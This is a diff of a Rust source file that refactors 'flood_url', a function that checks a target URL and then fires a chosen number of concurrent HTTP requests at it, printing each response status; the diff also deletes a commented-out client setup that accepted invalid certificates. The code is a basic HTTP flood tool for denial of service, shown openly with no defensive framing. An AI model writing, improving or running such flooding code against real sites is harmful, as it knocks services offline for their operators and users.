@@ -1,35 +1,13 @@
 use reqwest::Client;
-// use std::time::Duration;
-
-// pub struct ClientConfig {
-//     timeout: Duration,
-//     insecure: bool,
-
-// }
-
-// pub fn configure_http_client() -> Client {
-//     return Client::builder()
-//     .timeout(Duration::from_secs(10))
-//     .danger_accept_invalid_certs(true)
-//     .build()
-//     .expect("Error building HTTP Client");
-// }
 
 pub async fn flood_url(client: &Client, url: &str, requests: u32) {
     let mut handles= Vec::new();
 
-    let test_request = client.head(url).send().await;
-
-    match test_request {
-        Ok(resp) => {
-            println!("Check OK [{}], begining flood", resp.status());
-        }
-        Err(err) => {
-            println!("Error checkin target: {}", err);
-            return;
-        }
-
-    }
+    let Ok(resp) = client.head(url).send().await else {
+        println!("Failed to connect to target");
+        return;
+    };
+    println!("Target check OK [{}], starting flood...", resp.status());
 
     for _ in 1..=requests {
         let client_clone = client.clone();
@@ -40,18 +18,14 @@ pub async fn flood_url(client: &Client, url: &str, requests: u32) {
 
     for handle in handles {
         match handle.await {
-            Ok(handle_result) => {
-                match handle_result {
-                    Ok(resp) => {
-                        println!("Status {}", resp.status());
-                    }
-                    Err(err) => {
-                        println!("Error {}", err);
-                    }
-                }
+            Ok(Ok(resp)) => {
+                println!("Status: {}", resp.status());
             }
-            Err(err ) => {
-                println!("Network Error while flooding: {}", err);
+            Ok(Err(req_err)) => {
+                println!("Error: {}", req_err);
+            }
+            Err(tokio_err) => {
+                println!("Network error while flooding: {}", tokio_err);
             }
         }
 
